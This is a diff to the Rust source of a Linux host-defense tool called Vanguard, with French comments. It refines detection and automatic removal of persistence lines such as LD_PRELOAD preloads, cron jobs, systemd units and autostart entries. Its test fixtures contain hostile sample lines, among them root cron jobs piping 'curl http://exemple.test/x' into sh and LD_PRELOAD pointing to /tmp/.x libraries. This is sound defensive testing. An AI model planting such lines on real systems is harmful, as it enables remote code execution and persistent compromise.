@@ -843,8 +843,10 @@ fn simple_suspecte(
 }
 
 /// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
-/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
-pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
+/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien. Pour
+/// les essais seulement depuis la ronde 9 du lot 096 (le fils root ne retire plus de commande).
+#[cfg(test)]
+fn commande_lancee(ligne: &str) -> Option<String> {
     commande_lancee_lue(ligne).map(|(c, _)| c)
 }
 
@@ -885,7 +887,7 @@ fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
 /// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; un « unset » seul
 /// (`unset_seul`) la retire.
 pub(super) fn definit_prechargement(ligne: &str) -> bool {
-    !commentaire(ligne) && nomme_prechargement(ligne) && !unset_seul(ligne)
+    !commentaire(ligne) && pose_un_prechargement(ligne) && !unset_seul(ligne)
 }
 
 /// Une ligne qui ne fait que retirer des variables : « unset », puis des noms ou des options, rien d'autre.
@@ -927,15 +929,52 @@ fn commentaire_selon(ligne: &str, sorte: Variables) -> bool {
 /// n'est qu'un mot (R-2).
 fn prechargement_selon(ligne: &str, sorte: Variables) -> bool {
     match sorte {
-        Variables::Cles | Variables::Systemd => !commentaire_de_systemd(ligne) && nomme_prechargement(ligne),
-        Variables::Shell => !commentaire_du_shell(ligne) && nomme_prechargement(ligne) && !unset_seul(ligne),
+        Variables::Cles | Variables::Systemd => !commentaire_de_systemd(ligne) && pose_un_prechargement(ligne),
+        Variables::Shell => !commentaire_du_shell(ligne) && pose_un_prechargement(ligne) && !unset_seul(ligne),
         Variables::Hypr => definit_prechargement(ligne),
     }
 }
 
-/// Ligne qui nomme LD_PRELOAD ou LD_AUDIT, sans juger si c'est un commentaire.
-fn nomme_prechargement(ligne: &str) -> bool {
-    ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT")
+/// Ligne qui pose LD_PRELOAD ou LD_AUDIT, sans juger si c'est un commentaire : elle nomme l'une d'elles ailleurs que
+/// dans une forme qui la vide ou la retire (`neutralise_le_prechargement`). Ronde 9 du lot 096 (N9-4) : avant, toute
+/// ligne qui portait le texte « LD_PRELOAD » était signalée comme un préchargement, et son retrait offert, même
+/// « export LD_PRELOAD= » (une protection : la valeur vide ne précharge rien).
+pub(super) fn pose_un_prechargement(ligne: &str) -> bool {
+    (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT")) && !neutralise_le_prechargement(ligne)
+}
+
+/// La ligne ne fait-elle, de LD_PRELOAD et LD_AUDIT, que les vider ou les retirer ? Deux formes, et rien d'autre :
+/// - « UnsetEnvironment= » de systemd (blancs autour du « = » admis), suivi seulement de lettres et chiffres ASCII,
+///   de « _ » et de blancs : cette clé retire des variables, elle n'en pose jamais (avec un « = » ou un « / » dans la
+///   valeur, ou un « ; », la réponse est non : dans un fichier de shell, la suite serait une autre commande) ;
+/// - chaque fois que LD_PRELOAD ou LD_AUDIT y est écrit : en début de ligne, ou après un blanc ou un « = »
+///   (« export LD_PRELOAD= », « Environment=LD_PRELOAD= »), suivi d'un « = » puis de blancs seulement jusqu'au bout
+///   de la ligne. Pas « LD_PRELOAD= /x.so » : pam_env lit /etc/environment jusqu'au bout de la ligne, et y précharge
+///   « /x.so » ; ni « LD_PRELOAD='' », ni un « \r » final : dans le doute, la ligne reste signalée.
+fn neutralise_le_prechargement(ligne: &str) -> bool {
+    let blanc = |c: char| c == ' ' || c == '\t';
+    let l = ligne.trim_start_matches(blanc);
+    if let Some(reste) = l.strip_prefix("UnsetEnvironment")
+        && let Some(valeur) = reste.trim_start_matches(blanc).strip_prefix('=')
+    {
+        return valeur
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || blanc(c));
+    }
+    let mut vues = 0usize;
+    for nom in ["LD_PRELOAD", "LD_AUDIT"] {
+        for (i, _) in ligne.match_indices(nom) {
+            vues = vues.saturating_add(1);
+            let avant = ligne.get(..i).and_then(|a| a.chars().next_back());
+            let apres = ligne.get(i.saturating_add(nom.len())..).unwrap_or_default();
+            let debut_admis = avant.is_none_or(|c| blanc(c) || c == '=');
+            let vide = apres.strip_prefix('=').is_some_and(|v| v.chars().all(blanc));
+            if !(debut_admis && vide) {
+                return false;
+            }
+        }
+    }
+    vues > 0
 }
 
 /// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd, ou de tous ceux de ~/.config/hypr), liens vers
@@ -2121,10 +2160,16 @@ struct Lancements {
     longues: bool,
     /// Une ligne signalée dans /etc/rc.local dont la ligne « #! » ne nomme pas sh ou bash (ronde 8, N8-3).
     interprete: bool,
-    /// Une ligne signalée dans un fichier lu ligne par ligne (cron, .desktop, unité, gestionnaire de connexion) dont
-    /// le retrait seul n'a pas la forme stricte que son lecteur accepte à coup sûr, ou dont une autre ligne pose la
-    /// même clé (ronde 8, N8-4 : `linux::AnalyseDeRetrait`).
+    /// Une ligne signalée dans un fichier de gestionnaire de connexion dont le retrait seul n'a pas la forme stricte
+    /// que son lecteur accepte à coup sûr, ou dont une autre ligne pose la même clé (ronde 8, N8-4 :
+    /// `linux::AnalyseDeRetrait`).
     lecteur: bool,
+    /// Une ligne signalée dans une unité systemd, un fichier de cron ou d'anacron, un raccourci .desktop : Vanguard
+    /// n'y retire jamais une ligne lui-même (ronde 9, N9-1 et N9-2 : `linux::Decoupe::Format`).
+    format: bool,
+    /// Une ligne signalée qui n'est pas de celles que Vanguard retire lui-même (une variable autre que LD_PRELOAD ou
+    /// LD_AUDIT, une commande : ronde 9, N9-3, `linux::Decoupe::Hors`).
+    hors: bool,
     r: Releveur,
 }
 
@@ -7192,28 +7237,32 @@ impl IndexDeRetrait {
         }
     }
 
-    /// Le rendu de la ligne lue `l`, calculé une fois.
-    fn rendu(&self, lu: &Lecture, l: &str) -> Rendu {
+    /// La ligne lue `l` telle qu'écrite : la première ligne du texte qui se lit `l`, « \r » final compris.
+    fn ecrite(&self, lu: &Lecture, l: &str) -> String {
         use std::hash::BuildHasher;
-        if let Some(r) = self.rendus.borrow().get(l) {
-            return r.clone();
-        }
-        // La ligne telle qu'écrite : la première ligne du texte qui se lit `l`, « \r » final compris.
         let ligne_texte = |n: usize| {
             self.bornes_texte
                 .get(n)
                 .and_then(|(d, f)| lu.texte.get(*d..*f))
                 .unwrap_or_default()
         };
-        let ecrite = self
-            .lues
+        self.lues
             .get(&self.cles.hash_one(l.as_bytes()))
             .into_iter()
             .flatten()
             .map(|n| ligne_texte(*n))
             .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
             .unwrap_or(l)
-            .to_string();
+            .to_string()
+    }
+
+    /// Le rendu de la ligne lue `l`, calculé une fois.
+    fn rendu(&self, lu: &Lecture, l: &str) -> Rendu {
+        use std::hash::BuildHasher;
+        if let Some(r) = self.rendus.borrow().get(l) {
+            return r.clone();
+        }
+        let ecrite = self.ecrite(lu, l);
         let rendu = if lu.designable(&ecrite) {
             // Chaque ligne écrite pareille : le fils root les retire toutes.
             let numeros: Vec<usize> = self
@@ -7229,7 +7278,7 @@ impl IndexDeRetrait {
                         .is_some_and(|o| o == ecrite.as_bytes())
                 })
                 .collect();
-            match self.analyse.decoupe(&numeros) {
+            match self.analyse.refus(ecrite.as_bytes(), &numeros) {
                 Some(d) => Rendu::Decoupe(d),
                 None => Rendu::Ecrite(ecrite),
             }
@@ -7268,6 +7317,14 @@ fn retrait(t: &mut Lancements, f: &Path, lu: &Lecture, l: &str) -> Option<(Strin
         }
         Rendu::Decoupe(crate::machine::linux::Decoupe::Lecteur) => {
             t.lecteur = true;
+            None
+        }
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Format) => {
+            t.format = true;
+            None
+        }
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Hors) => {
+            t.hors = true;
             None
         }
         Rendu::Decoupe(crate::machine::linux::Decoupe::Barre | crate::machine::linux::Decoupe::Shell) => {
@@ -14082,6 +14139,8 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         longues,
         interprete,
         lecteur,
+        format,
+        hors,
         ..
     } = t;
     suspects.sort();
@@ -14171,8 +14230,20 @@ fn constat_des_lancements(t: Lancements) -> Constat {
     }
     if lecteur {
         message.push_str(tr!(
-            " Une ligne signalée est dans un fichier lu ligne par ligne (cron, raccourci .desktop, unité systemd, gestionnaire de connexion) où elle n'a pas la forme stricte que son lecteur accepte à coup sûr, où une autre ligne pose la même clé, ou que cron pourrait ignorer tout entier : la retirer seule pourrait réveiller d'autres lignes ; tout est à corriger à la main.",
-            " A reported line is in a file read line by line (cron, .desktop shortcut, systemd unit, login manager) where it does not have the strict form its reader surely accepts, where another line sets the same key, or that cron could ignore entirely: removing it alone could wake up other lines; everything is to be fixed by hand."
+            " Une ligne signalée est dans un fichier de gestionnaire de connexion où elle n'a pas la forme stricte que son lecteur accepte à coup sûr, ou où une autre ligne pose la même clé : la retirer seule pourrait réveiller d'autres lignes ; tout est à corriger à la main.",
+            " A reported line is in a login manager file where it does not have the strict form its reader surely accepts, or where another line sets the same key: removing it alone could wake up other lines; everything is to be fixed by hand."
+        ));
+    }
+    if format {
+        message.push_str(tr!(
+            " Une ligne signalée est dans une unité systemd, un fichier de cron ou d'anacron, ou un raccourci .desktop : une ligne peut y en retenir une autre (« ExecStartPre= » qui empêche « ExecStart= », « SHELL= » qui fait échouer les tâches de cron qui suivent), et en retirer une seule pourrait faire lancer ce qu'elle retenait. Vanguard ne corrige jamais ces fichiers lui-même : tout est à corriger à la main.",
+            " A reported line is in a systemd unit, a cron or anacron file, or a .desktop shortcut: a line there can hold back another one (\"ExecStartPre=\" that stops \"ExecStart=\", \"SHELL=\" that makes the cron jobs after it fail), and removing one alone could start what it held back. Vanguard never fixes these files itself: everything is to be fixed by hand."
+        ));
+    }
+    if hors {
+        message.push_str(tr!(
+            " Une ligne signalée n'est pas de celles que Vanguard retire lui-même (il ne retire seul qu'une affectation simple de LD_PRELOAD ou de LD_AUDIT, et l'ouverture automatique d'une session) : tout est à corriger à la main.",
+            " A reported line is not one Vanguard removes itself (it only removes on its own a simple assignment of LD_PRELOAD or LD_AUDIT, and automatic session login): everything is to be fixed by hand."
         ));
     }
     if let Some(a) = a_savoir {
@@ -15006,14 +15077,10 @@ mod tests {
                 utf8: true,
                 index: std::cell::OnceCell::new(),
             };
-            // Lu ligne par ligne, par anacron, qui saute une ligne qu'il ne comprend pas : la règle du shell (ronde
-            // 6 du lot 096) et celle des fichiers à clés (ronde 8, N8-4 : « \r » refusé) refuseraient ces lignes, ce
-            // n'est pas ce que l'essai regarde.
-            let index = IndexDeRetrait::de(Path::new("/etc/anacrontab"), &lu);
-            assert!(
-                matches!(index.rendu(&lu, l), Rendu::Ecrite(e) if e == ecrite),
-                "{texte:?} {l:?}"
-            );
+            // La forme écrite seule : toute règle de retrait refuse ces lignes (« \r », pas une affectation de
+            // LD_PRELOAD), ce n'est pas ce que l'essai regarde.
+            let index = IndexDeRetrait::de(Path::new("/etc/environment"), &lu);
+            assert_eq!(index.ecrite(&lu, l), ecrite, "{texte:?} {l:?}");
         }
     }
 
@@ -20204,18 +20271,22 @@ mod tests {
     #[test]
     fn ligne_hors_utf8_a_la_main() {
         let phrase = "n'est pas du texte UTF-8";
-        for (i, (lieu, octets, designable)) in [
-            ("etc/ld.so.preload", &b"/tmp/.x/\xff.so\n"[..], false),
-            ("etc/ld.so.preload", b"/tmp/.x/l.so\n", true),
+        // (lieu, octets, en UTF-8, retiré par geste). Ronde 9 du lot 096 (N9-2) : une ligne de cron ne se retire
+        // plus par geste, même en UTF-8 ; elle reste à la main pour une autre raison, et la phrase d'UTF-8 n'y est pas.
+        for (i, (lieu, octets, utf8, designable)) in [
+            ("etc/ld.so.preload", &b"/tmp/.x/\xff.so\n"[..], false, false),
+            ("etc/ld.so.preload", b"/tmp/.x/l.so\n", true, true),
             (
                 "etc/cron.d/maj",
                 b"* * * * * root curl http://exemple.test/\xff | sh\n",
+                false,
                 false,
             ),
             (
                 "etc/cron.d/maj",
                 b"* * * * * root curl http://exemple.test/x | sh\n",
                 true,
+                false,
             ),
         ]
         .into_iter()
@@ -20228,12 +20299,7 @@ mod tests {
             // Le bilan entier : la ligne est levée, et la phrase « à la main » ne vient que hors UTF-8.
             let c = m.lancements();
             leve(&c, lieu);
-            assert_eq!(
-                c.message.contains(phrase),
-                !designable,
-                "{lieu} {octets:?} : {}",
-                c.message
-            );
+            assert_eq!(c.message.contains(phrase), !utf8, "{lieu} {octets:?} : {}", c.message);
             // Le relevé seul, puis le choix du geste avec le vrai chemin.
             let variable = |_: &str| -> Option<std::ffi::OsString> { None };
             let mut t = Lancements {
@@ -20245,7 +20311,8 @@ mod tests {
             } else {
                 juger_cron(&m.racine, None, &mut t);
             }
-            assert_eq!(t.hors_utf8, !designable, "{lieu} {octets:?}");
+            assert_eq!(t.hors_utf8, !utf8, "{lieu} {octets:?}");
+            assert_eq!(t.format, lieu == "etc/cron.d/maj" && utf8, "{lieu} {octets:?}");
             assert_eq!(t.retraits.len(), 1, "{lieu} {octets:?}");
             assert_eq!(t.retraits[0].is_some(), designable, "{lieu} {octets:?}");
             let racine = m.racine.to_str().unwrap().to_string();
@@ -20255,7 +20322,7 @@ mod tests {
             let c = constat_des_lancements(t);
             let auto = c.correctif.as_ref().is_some_and(|k| k.automatique);
             assert_eq!(auto, designable, "{lieu} {octets:?} : {}", c.message);
-            assert_eq!(c.message.contains(phrase), !designable, "{}", c.message);
+            assert_eq!(c.message.contains(phrase), !utf8, "{}", c.message);
         }
     }
 
@@ -20267,10 +20334,12 @@ mod tests {
     fn bilan_de_lignes_pareilles_lineaire() {
         for (i, n) in [800usize, 8000].into_iter().enumerate() {
             for (j, pareilles) in [true, false].into_iter().enumerate() {
+                // Ronde 9 du lot 096 (N9-3) : seuls LD_PRELOAD et LD_AUDIT se retirent ; des lignes toutes
+                // différentes posent donc le même NOM, et le fichier entier reste à la main.
                 let contenu = (0..n)
                     .map(|k| {
-                        let nom = if pareilles { 0 } else { k };
-                        format!("export LD_X{nom}=/tmp/.x/LD_PRELOAD{k}.so\n")
+                        let valeur = if pareilles { 0 } else { k };
+                        format!("export LD_PRELOAD=/tmp/.x/a{valeur}.so\n")
                     })
                     .collect::<Vec<_>>()
                     .concat();
@@ -20292,11 +20361,11 @@ mod tests {
                     &mut t,
                 );
                 // Des lignes qui posent le même NOM font refuser tout retrait du fichier (ronde 7 du lot 096 : chaque
-                // NOM une fois) : le jugement reste linéaire, à la main. Des NOMS tous différents partent.
-                assert_eq!(t.jointes, pareilles);
+                // NOM une fois) : le jugement reste linéaire, à la main.
+                assert!(t.jointes);
                 assert!(!t.trop_long);
                 assert_eq!(t.retraits.len(), n);
-                assert!(t.retraits.iter().all(|r| r.is_some() != pareilles));
+                assert!(t.retraits.iter().all(Option::is_none));
                 let c = constat_des_lancements(t);
                 let duree = debut.elapsed();
                 let pas = crate::machine::linux::PAS_DE_RETRAIT.with(std::cell::Cell::get);
@@ -20377,27 +20446,9 @@ mod tests {
                 false,
             ),
             (
-                "/etc/xdg/autostart/a.desktop",
-                "[Desktop Entry]\nExec=/usr/bin/true\nExec=/tmp/.x/a\n".to_string(),
-                "même clé",
-                true,
-            ),
-            (
-                "/etc/xdg/autostart/a.desktop",
-                "[Desktop Entry]\nName=A\nExec=/tmp/.x/a\n".to_string(),
-                "même clé",
-                false,
-            ),
-            (
-                "/etc/cron.d/x",
-                "* * * * * alice curl http://exemple.test/x | sh\n".to_string(),
-                "forme stricte",
-                true,
-            ),
-            (
-                "/etc/cron.d/x",
-                "* * * * * root curl http://exemple.test/x | sh\n".to_string(),
-                "forme stricte",
+                "/etc/environment",
+                format!("{piege}\nA=b\n"),
+                "Vanguard ne corrige jamais ces fichiers",
                 false,
             ),
         ]
@@ -20418,6 +20469,71 @@ mod tests {
             // offert ici (le retrait lui-même est tenu par `linux::tests` et `defense_eleve::tests::refus_de_la_ronde_8`).
             assert!(!c.correctif.as_ref().is_some_and(|k| k.automatique), "{}", c.message);
         }
+    }
+
+    /// Ronde 9 du lot 096 (N9-1, N9-2, N9-4), bout en bout : une ligne signalée dans une unité systemd, un fichier de
+    /// cron ou un raccourci .desktop dit que Vanguard ne corrige jamais ces fichiers ; une ligne qui vide LD_PRELOAD
+    /// ou LD_AUDIT (« LD_PRELOAD= », « export LD_AUDIT= », « UnsetEnvironment=LD_PRELOAD ») n'est pas signalée.
+    #[test]
+    fn raisons_de_la_ronde_9_au_bilan() {
+        let format = "Vanguard ne corrige jamais ces fichiers";
+        for (i, (lieu, contenu)) in [
+            (
+                "/etc/xdg/autostart/a.desktop",
+                "[Desktop Entry]\nExec=/usr/bin/true\nExec=/tmp/.x/a\n",
+            ),
+            (
+                "/etc/xdg/autostart/b.desktop",
+                "[Desktop Entry]\nName=A\nExec=/tmp/.x/a\n",
+            ),
+            ("/etc/cron.d/x", "* * * * * alice curl http://exemple.test/x | sh\n"),
+            ("/etc/cron.d/y", "* * * * * root curl http://exemple.test/x | sh\n"),
+            (
+                "/etc/systemd/system/a.service",
+                "[Service]\nEnvironment=LD_PRELOAD=/tmp/.x/a.so\nExecStart=/usr/bin/true\n",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("ronde-9-{i}"));
+            m.ecrire_hors(lieu, contenu);
+            let c = m.lancements();
+            leve(&c, lieu);
+            assert!(c.message.contains(format), "{lieu} {contenu:?} : {}", c.message);
+        }
+        for (i, (lieu, contenu)) in [
+            ("/etc/environment", "LD_PRELOAD=\nA=b\n"),
+            ("/etc/profile.d/a.sh", "export LD_PRELOAD=\n"),
+            ("/etc/profile.d/b.sh", "export LD_AUDIT=\n"),
+            ("/etc/environment.d/50-a.conf", "LD_PRELOAD=\n"),
+            (
+                "/etc/systemd/system/b.service",
+                "[Service]\nUnsetEnvironment=LD_PRELOAD LD_AUDIT\nExecStart=/usr/bin/true\n",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("ronde-9-neutre-{i}"));
+            m.ecrire_hors(lieu, contenu);
+            let c = m.lancements();
+            assert_eq!(c.probleme, None, "{lieu} {contenu:?} : {}", c.message);
+        }
+        // N9-3 : une autre variable suspecte est signalée, mais le retrait n'est pas offert (le fils root le refuse).
+        let m = Maison::nouvelle("ronde-9-hors");
+        m.ecrire_hors("/etc/profile.d/a.sh", "export PYTHONPATH=/tmp/.x\n");
+        let c = m.lancements();
+        leve(&c, "/etc/profile.d/a.sh");
+        assert!(
+            c.message.contains("n'est pas de celles que Vanguard retire lui-même"),
+            "{}",
+            c.message
+        );
+        // Témoin : la même ligne avec une bibliothèque est signalée.
+        let m = Maison::nouvelle("ronde-9-temoin");
+        m.ecrire_hors("/etc/profile.d/a.sh", "export LD_PRELOAD=/tmp/.x/a.so\n");
+        leve(&m.lancements(), "/etc/profile.d/a.sh");
     }
 
     /// Ronde 3 du lot 096 (N1, N2), bout en bout : le fichier de variables d'une unité du compte, lu comme systemd le
